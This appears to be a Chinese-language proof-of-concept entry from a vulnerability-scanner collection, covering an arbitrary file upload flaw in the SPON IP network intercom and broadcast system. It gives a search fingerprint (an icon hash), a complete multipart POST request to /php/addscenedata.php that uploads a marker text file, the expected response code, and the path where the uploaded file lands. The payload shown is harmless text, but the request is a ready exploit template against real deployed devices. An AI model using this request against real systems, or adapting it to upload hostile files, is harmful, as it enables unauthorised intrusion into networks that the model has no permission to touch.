﻿# spon IP网络对讲广播系统任意文件上传漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：icon_hash="-1700598274"

> 验证脚本：HTTP

```
POST /php/addscenedata.php HTTP/1.1
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
Accept-Encoding: gzip

------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="upload"; filename="dudesuite.txt"
Content-Type: text/plain

dudesuite
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/images/scene/dudesuite.txt


> 验证文件来源：spon IP网络对讲广播系统任意文件上传漏洞.poc
